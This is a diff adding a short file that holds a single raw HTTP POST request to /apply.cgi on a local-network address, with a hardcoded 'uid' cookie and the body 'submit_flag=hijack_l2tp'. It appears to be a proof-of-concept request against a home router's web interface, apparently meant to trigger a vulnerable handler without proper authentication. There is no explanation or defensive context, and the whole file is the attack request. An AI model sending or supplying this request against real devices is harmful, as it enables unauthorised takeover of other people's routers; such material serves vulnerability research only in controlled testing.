@@ -1,0 +1,7 @@
+POST /apply.cgi HTTP/1.1
+HOST: 192.168.0.50
+Cookie: uid=xhyxhy
+Content-Type: text/html
+Content-Length: 23
+
+submit_flag=hijack_l2tp
